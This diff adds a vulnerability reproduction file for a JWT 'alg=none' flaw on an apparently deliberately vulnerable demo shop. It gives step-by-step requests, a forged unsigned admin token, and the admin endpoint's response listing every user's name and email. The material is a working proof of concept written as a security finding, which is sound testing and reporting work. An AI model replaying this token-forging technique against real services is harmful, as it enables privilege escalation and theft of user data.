@@ -1,0 +1,43 @@
+JWT Algorithm Confusion (alg=none) Vulnerability - Reproduction Evidence
+
+=== Step 1: Register a user account ===
+POST https://duck-store.escape.tech/api/v1/auth/register
+{"username":"testuser1","email":"a@b.c","password":"TestPass123!"}
+
+Response:
+{"username":"testuser1","email":"a@b.c","id":"303572b3-5970-414d-b65a-d6f98adc329f","created_at":"2026-09-29T05:43:37.201011","role":"user","first_name":null,"last_name":null,"avatar_url":null,"bio":null,"account_credit":0.0,"referral_count":0,"totp_enabled":false,"can_be_deleted":true}
+
+=== Step 2: Login to get valid JWT ===
+POST https://duck-store.escape.tech/api/v1/auth/login
+{"username":"testuser1","password":"TestPass123!"}
+
+Response:
+{"access_token":"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjoiMzAzNTcyYjMtNTk3MC00MTRkLWI2NWEtZDZmOThhZGMzMjlmIiwidXNlcm5hbWUiOiJ0ZXN0dXNlcjEiLCJyb2xlIjoidXNlciIsImV4cCI6MTc5MDY2MjQxOX0.gjRoj_70xAmNQgQzyaPuzhSkv_BhIHUvlWchc9Dvxo4","token_type":"bearer","requires_totp":false,"temp_token":null}
+
+Decoded original JWT:
+Header: {"alg":"HS256","typ":"JWT"}
+Payload: {"user_id":"303572b3-5970-414d-b65a-d6f98adc329f","username":"testuser1","role":"user","exp":1790662419}
+
+=== Step 3: Forge JWT with alg=none and admin role ===
+Forged token: eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VyX2lkIjoiMzAzNTcyYjMtNTk3MC00MTRkLWI2NWEtZDZmOThhZGMzMjlmIiwidXNlcm5hbWUiOiJ0ZXN0dXNlcjEiLCJyb2xlIjoiYWRtaW4iLCJleHAiOjE3OTA2NjI0MTl9.
+
+Decoded forged JWT:
+Header: {"alg":"none","typ":"JWT"}
+Payload: {"user_id":"303572b3-5970-414d-b65a-d6f98adc329f","username":"testuser1","role":"admin","exp":1790662419}
+
+=== Step 4: Test forged token on /api/v1/users/me/profile ===
+GET https://duck-store.escape.tech/api/v1/users/me/profile
+Authorization: Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VyX2lkIjoiMzAzNTcyYjMtNTk3MC00MTRkLWI2NWEtZDZmOThhZGMzMjlmIiwidXNlcm5hbWUiOiJ0ZXN0dXNlcjEiLCJyb2xlIjoiYWRtaW4iLCJleHAiOjE3OTA2NjI0MTl9.
+
+Response:
+{"username":"testuser1","email":"a@b.c","id":"303572b3-5970-414d-b65a-d6f98adc329f","created_at":"2026-09-29T05:43:37.201011","role":"user","first_name":null,"last_name":null,"avatar_url":null,"bio":null,"account_credit":0.0,"referral_count":0,"totp_enabled":false,"can_be_deleted":true}
+
+=== Step 5: Test forged token on admin endpoint /api/v1/admin/users ===
+GET https://duck-store.escape.tech/api/v1/admin/users
+Authorization: Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VyX2lkIjoiMzAzNTcyYjMtNTk3MC00MTRkLWI2NWEtZDZmOThhZGMzMjlmIiwidXNlcm5hbWUiOiJ0ZXN0dXNlcjEiLCJyb2xlIjoiYWRtaW4iLCJleHAiOjE3OTA2NjI0MTl9.
+
+Response (truncated - returns ALL users including admin):
+[{"username":"admin","email":"admin@duck-store.escape","id":"550e8400-e29b-41d4-a716-446655440000","created_at":"2026-09-29T05:39:16.420937","role":"admin","first_name":"Admin","last_name":"Duck","avatar_url":"/static/avatars/sarah.png","bio":"Store Administrator","account_credit":0.0,"referral_count":0,"totp_enabled":false,"can_be_deleted":false},{"username":"sarah_j","email":"sarah.johnson@email.com","id":"6ba7b810-9dad-11d1-80b4-00c04fd430c8","created_at":"2026-09-29T05:39:16.454535","role":"user","first_name":"Sarah","last_name":"Johnson","avatar_url":"/static/avatars/sarah.png","bio":"Happy dev","account_credit":0.0,"referral_count":0,"totp_enabled":false,"can_be_deleted":true},{"username":"david_j","email":"david.johnson@email.com","id":"6ba7b811-9dad-11d1-80b4-00c04fd430c8","created_at":"2026-09-29T05:39:16.454545","role":"user","first_name":"David","last_name":"Johnson","avatar_url":"/static/avatars/david.png","bio":"Director of Application Security","account_credit":0.0,"referral_count":0,"totp_enabled":false,"can_be_deleted":true},{"username":"emma_n","email":"emma.nakamura@email.com","id":"6ba7b812-9dad-11d1-80b4-00c04fd430c8","created_at":"2026-09-29T05:39:16.454550","role":"user","first_name":"Emma","last_name":"Nakamura","avatar_url":"/static/avatars/emma.png","bio":"Security Researcher","account_credit":0.0,"referral_count":0,"totp_enabled":false,"can_be_deleted":true},{"username":"michael_r","email":"michael.rodriguez@email.com","id":"6ba7b813-9dad-11d1-80b4-00c04fd430c8","created_at":"2026-09-29T05:39:16.454554","role":"user","first_name":"Michael","last_name":"Rodriguez","avatar_url":"/static/avatars/michael.png","bio":"Senior DevOps Engineer","account_credit":0.0,"referral_count":0,"totp_enabled":false,"can_be_deleted":true},{"username":"patricia_a","email":"patricia.anderson@email.com","id":"6ba7b814-9dad-11d1-80b4-00c04fd430c8","created_at":"2026-09-29T05:39:16.454558","role":"user","first_name":"Patricia","last_name":"Anderson","avatar_url":"/static/avatars/patricia.png","bio":"CISO","account_credit":0.0,"referral_count":0,"totp_enabled":false,"can_be_deleted":true},{"username":"escape_scanner","email":"escape.security@email.com","id":"6ba7b815-9dad-11d1-80b4-00c04fd430c8","created_at":"2026-09-29T05:39:16.525955","role":"user","first_name":"Escape","last_name":"Security","avatar_url":"/static/avatars/escape.png","bio":"Escape Security","account_credit":0.0,"referral_count":0,"totp_enabled":false,"can_be_deleted":false},{"username":"escape_scanner_bis","email":"escape.security2@email.com","id":"6ba7b816-9dad-11d1-80b4-00c04fd430c8","created_at":"2026-09-29T05:39:16.525969","role":"user","first_name":"Escape","last_name":"Security 2","avatar_url":"/static/avatars/escape.png","bio":"Escape Security 2","account_credit":0.0,"referral_count":0,"totp_enabled":false,"can_be_deleted":false},{"username":"escape_scanner_priv","email":"escape.security.priv@email.com","id":"6ba7b817-9dad-11d1-80b4-00c04fd430c8","created_at":"2026-09-29T05:39:16.528440","role":"admin","first_name":"Escape","last_name":"Security Priv","avatar_url":"/static/avatars/escape.png","bio":"Escape Security (privileged scanner)","account_credit":0.0,"referral_count":0,"totp_enabled":false,"can_be_deleted":false},{"username":"victim_user","email":"victim@duck-store.escape.tech","id":"37ca7952-784b-46e2-b1ce-d9c204441c4a","created_at":"2026-09-29T05:41:58.936418","role":"user","first_name":null,"last_name":null,"avatar_url":null,"bio":null,"account_credit":0.0,"referral_count":0,"totp_enabled":false,"can_be_deleted":true},{"username":"testuser123","email":"testuser123@local.host","id":"0ec903cf-ac2c-49e8-9651-42ec7645c1f4","created_at":"2026-09-29T05:43:03.075388","role":"user","first_name":null,"last_name":null,"avatar_url":null,"bio":null,"account_credit":0.0,"referral_count":0,"totp_enabled":false,"can_be_deleted":true},{"username":"testuser1","email":"a@b.c","id":"303572b3-5970-414d-b65a-d6f98adc329f","created_at":"2026-09-29T05:43:37.201011","role":"user","first_name":null,"last_name":null,"avatar_url":null,"bio":null,"account_credit":0.0,"referral_count":0,"totp_enabled":false,"can_be_deleted":true}]
+
+=== CONCLUSION ===
+The application accepts JWT tokens with "alg": "none" (no signature verification), allowing an attacker to forge arbitrary tokens with any claims. The forged token with role:"admin" successfully granted access to the admin endpoint /api/v1/admin/users, returning all users' sensitive data (emails, IDs, roles, etc.). This confirms the JWT Algorithm Confusion vulnerability with critical impact - privilege escalation and unauthorized data access.
